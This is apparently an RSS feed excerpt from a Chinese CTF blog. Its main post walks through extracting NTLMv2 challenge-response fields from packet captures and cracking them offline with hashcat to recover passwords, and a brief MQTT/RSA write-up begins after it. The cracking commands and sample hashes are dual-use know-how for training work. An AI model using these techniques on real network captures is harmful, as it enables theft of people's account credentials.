class=&#34;line&#34;&gt;        pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print (&amp;#x27;output :&amp;#x27; + &amp;quot;&amp;quot;.join(output))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到 flag&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fWB6zzlzqpbQMUS.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/</guid>
            <title>NTLM协议流量解密</title>
            <link>https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;例一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例一&#34;&gt;#&lt;/a&gt; 例一：&lt;/h1&gt;
&lt;p&gt;近期做到一道 NTLM 协议的流量题，第一次进行解密，记录一下&lt;/p&gt;
&lt;p&gt;解密该协议的流量，其实就是得到用户名的密码，需要寻找一些字段信息并用 hashcat 进行爆破&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;先进行过滤：ntlmssp&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GVJwR28aDugcmZ5Z.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到 NTLMSSP_AUTH 包，得到 domain name 和 user name&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/86wHbcx3hzyDMEP9.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;追踪 NTLM response，可以得到 NTproofstring 和 modifiedntlmv2response&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6ikrvW90lTRU45Xu.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里 modifiedntlmv2response 开头部分包括了 NTproofstring 的值，组成的时候需要删除重复部分&lt;/p&gt;
&lt;p&gt;接着寻找 ServerChallenge，过滤 ntlmssp.ntlmserverchallenge&lt;/p&gt;
&lt;p&gt;找到符合条件的包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q5T0wy90FUlhEak2.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;将得到的手动组成&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;administrator:::1166026a7745c2d0:971356880954f778c48937ad52ccae51:01010000000000005a308cd161f7d8016092111fede1fd960000000002001e004400450053004b0054004f0050002d004a0052005500510045003900360001001e004400450053004b0054004f0050002d004a0052005500510045003900360004001e004400450053004b0054004f0050002d004a0052005500510045003900360003001e004400450053004b0054004f0050002d004a00520055005100450039003600070008005a308cd161f7d80106000400020000000800300030000000000000000100000000200000a2fc8de06e3dff62c01429115953f2f8ea32e069bc69837a7b03ee0112ca689a0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e0031000000000000000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 hashcat 进行爆破&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./hashcat.exe -m 5600 hash.txt passwords.txt -o out.txt --force&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#hash.txt中是组成的内容，password.txt是字典（在该附件中进行分段传输，利用原始数据提取出来就好），-o参数表示将结果存储到out.txt文本当中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./hashcat.exe -m 5600 hash.txt passwords.txt --show&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果已经爆破就使用--show展示出来&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6sZRgp60VShOHJmN.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到最终的密码 @Aa123456789&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2doLWJhbHRoYXphcmJyYXR0L25vY2FzaHZhbHVl&#34;&gt;https://github.com/gh-balthazarbratt/nocashvalue&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;该脚本也可以自动提取&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./main.py --tshark_path /usr/bin/tshark --pcap_file NTLM.pcapng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Ur6g4fjiJtVN53F.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fC8FuuWxvXV3QmQH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3j0QhBFizJCq9Ek5.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是脚本提取也有些问题，最后一个字段值开头会少一位，需要自己手动加一个 0，并且 NULL 处不需要填写，手动删除&lt;/p&gt;
&lt;h1 id=&#34;例二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例二&#34;&gt;#&lt;/a&gt; 例二：&lt;/h1&gt;
&lt;p&gt;拿最近的 geek challenge 的一道不太一样的题目再次来进行详细说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjCsftpPeqPC8UDd.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到流量包追踪一下 tcp 流，结合题目可以知道&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bk9XBs7Cd97DHNAH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是内网通信的流量，并且使用了 NTLM 验证身份的方式，上网搜索了一下该验证方式的工作流程，大致为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.首先客户端在本地加密当前用户的密码成hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.客户端向服务端发送账号，这里进行了明文传输&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.服务端确认了NTLM认证方式，并随机生成了16位的字符串作为challenge发送给了客户端&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.客户端再用生成的hash加密该challenge发送回服务端作为response&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5.服务端再把用户名，challenge和response发送给域控制器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6.域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，并同样加密challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7.比较两个加密后的challenge，如果相同则认证成功&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来回看这道题目，既然是截获了通讯流量那么也就是说客户端和服务端所进行的一些通信数据都直接被截获了，根据题目要求，要找到用户的密码。根据工作流程可以知道，hashcat 爆破用户密码所需要的一些字段信息都能被流量所捕获到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pNucLoAZNeu76EEx.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且通过最后一个返回包中的对话信息可以知道密码字典为 rockyou，接下来寻找到需要的字段就可以开始进行爆破了，以下为需要寻找的字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mVGJwwn0vCW3Btiu.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mpmcyKvrKJNaO6NN.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;过滤 ntlmssp.ntlmserverchallenge 能找到 challenge 字段信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bDBpfIq4o1HmUWFv.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将得到的字段值拼接利用 hashcat 进行爆破&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./hashcat.exe -m 5600 1.txt rockyou.txt -o out.txt --force&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 out.txt 中得到爆破出的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lURCG5lq2sLKO7uO.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SYC{iamjackspassword}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;例三&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例三&#34;&gt;#&lt;/a&gt; 例三：&lt;/h1&gt;
&lt;p&gt;接下来用另一道题更深入地剖析一下 NTLM 协议传输字段值的组成，同样来自 geek&lt;br&gt;
challenge&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/D7jn883rE2SNW2Lg.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;该题抓取了用户进行邮箱登录的 SMTP 协议流量，并选择了 NTLM 的认证方式，所以本质上的考点还是通过 NTLM 协议的流量寻找字段进行组合爆破 hash&lt;/p&gt;
&lt;p&gt;浅浅了解一下 SMTP 通讯协议吧&lt;/p&gt;
&lt;p&gt;该协议是一个简单的邮件传送协议，用下图来进行说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9wMVKsPkEMymr6nS.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.用户在用户代理中编辑邮件信息，包括发件人邮箱标题等等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.用户代理提取用户编辑的信息，生成一封符合邮件格式标准（RFC822）的邮件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.用户代理利用SMTP协议将邮件发送给发送端的邮件服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.发送端的邮件服务器同样通过SMTP协议将邮件发送给接收端的邮件服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5.接收端的用户代理利用POP3协议从接收端服务器取回邮件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6.用户代理端接收邮件并解析读取&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看回本题，本题并没有进行邮件收发的操作，截取的是登录邮件服务器认证过程的流量&lt;br&gt;
&lt;strong&gt;首先是客户端对邮件服务器的 25 端口进行的三次握手&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/g2YID2WJGS4p7g8X.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;握手成功后服务端会主动向客户端发送准备就绪的信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8sEYKHwWAjKi6BKa.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;网易邮箱一般都形如 &amp;quot;220 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE2My5jb20=&#34;&gt;163.com&lt;/span&gt; Anti-spam GT for Coremail System&lt;br&gt;
 (163com [20111010])&amp;quot;；QQ 邮箱形如&amp;quot;220 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NtdHAucXEuY29t&#34;&gt;smtp.qq.com&lt;/span&gt; Esmtp QQ Mail&lt;br&gt;
Server&amp;quot;；Google 邮箱形如&amp;quot;220 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL214Lmdvb2dsZS5jb20=&#34;&gt;mx.google.com&lt;/span&gt; ESMTP&lt;br&gt;
nw8sm917193igc.7&amp;quot;。其中 220 代表服务就绪，每一条服务就绪信息以&amp;quot;rn&amp;quot; 为结尾标示符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Rvww53De6hWB1yt.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接着客户端向 SMTP 服务器交代自己的身份，也就是机器名（DESKTOP-xxxxxxx）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yJk8GuhPiaFjh2Er.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;身份认证通过后，服务器会进入等待认证状态，会主动推送所有支持的 SMTP 认证方式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Nl9HXxe6Y4tmXnLe.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接下来就是客户端进行选择认证方式进行认证&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/88apimQEgweC3Blg.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直到 235 2.7.0 Authentication successful，认证成功&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/P73K5cN5E2o9DWzV.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;数据包分析结束，看看题目，本题中该数据包清晰的显示了一整个身份校验以及认证的流程，这里可以看到客户端选择的认证方式是 NTLM，NTLM 的认证方式和 login 差不多，根据上面题目可以知道，既然是 NTLM 协议进行认证，那么密码给出的是 hash 值来进行加密和传输，因此需要构造字段值进行 hash 爆破&lt;/p&gt;
&lt;p&gt;但是本题的 wireshark 当中并没有直接显示出各个字段的值方便确认，只显示出了原始的 base64 编码，猜测原因是之前是直接通过 NTLM 协议认证进行内网通信，而这里是登录邮件服务器选择了支持 SMTP 的 NTLM 协议认证方式，所以 wireshark 并没有解析出字段值&lt;/p&gt;
&lt;p&gt;无妨，自己对照着数据包去解码寻找对应的数据块吧&lt;/p&gt;
&lt;p&gt;把大小为 420 和 789 的两个数据包解码后转为 16 进制&lt;/p&gt;
&lt;p&gt;发现在大小为 420 的数据包中，24 字节头部数据之后的 8 字节数据便是 ServerChallenge 字段&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NKGtEU1biVhn7fEc.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来解析大小为 789 的数据包获得剩余字段值&lt;/p&gt;
&lt;p&gt;88 字节数据之后跟着的是 domainname 和 username（根据之前题目的数据包来看，domain&lt;br&gt;
name 和 username 字段数据也是挨着的）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/37oHMH99cS9bMUk8.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EnaZCTJopkyLupBH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据题目所述，username 为 jack，因此为下图的 8 字节数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RrN6m7D1nxMrniEg.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来间隔 client01 字段，这里有 40 字节数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UVpBmy5pntuY3AFT.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;从该字段结束部分到末尾的 16 字节数据之前为 NTLMv2 Response 数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhU7iqKb2Ux78p91.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以知道的是 NTLMv2 Response 数据头部的 16 字节数据便是 NTProofStr 数据&lt;/p&gt;
&lt;p&gt;到这为止已经剖析到我们爆破所需的所有数据了，整合一下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的 domain&lt;br&gt;
name 不止可以通过在 NTLM 认证过程中获得，其实就是之前所说的 SMTP 通讯过程中客户端向邮件服务器发送的机器名称&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dU7RQs7tmPaVAEUF.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里有一个需要注意的点，domain&lt;br&gt;
name 的大小写必须按照给出的大小写来填入，不能改动&lt;/p&gt;
&lt;p&gt;接下来就是熟悉的 hash 爆破了，利用 rockyou 字典进行爆破&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./hashcat.exe -m 5600 10.txt rockyou.txt -o out1.txt --force&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9s2OYOfWjwPykhJk.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到密码 jack100589barney，便是 flag&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SYC{jack100589barney}&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/MQTT/</guid>
            <title>某工控Misc MQTT协议流量分析</title>
            <link>https://nnnpc.github.io/2024/04/16/MQTT/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;本题的考点在于 MQTT 协议流量的分析和 rsa 解密，首先看到流量包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/br3Nq1ffF08DaaSz.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;很干净不需要过滤，去了解下 MQTT 协议能知道&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AjNPCVwBJCqNkoSy.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RQNvdc0RnlqdpVio.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;每个包的 message 字段中存储了需要传输的值，先看了头几个包&lt;/p&gt;
&lt;p&gt;发现了 rsakey 字段，于是使用命令提取数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tshark -r Covertchannel.pcap -Y &amp;quot;mqtt&amp;quot; -T fields -e mqtt.msg &amp;gt; 1.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;简单做一下处理：（删除逗号和换行）并进行 16 进制转换和 base64 解码，得到私钥，secret.txt 和 data.zip&lt;br&gt;
 发现 data.zip 文件需要密码&lt;/p&gt;
&lt;p&gt;那么猜测需要利用私钥去解密被公钥加密的文件 secret.txt&lt;/p&gt;
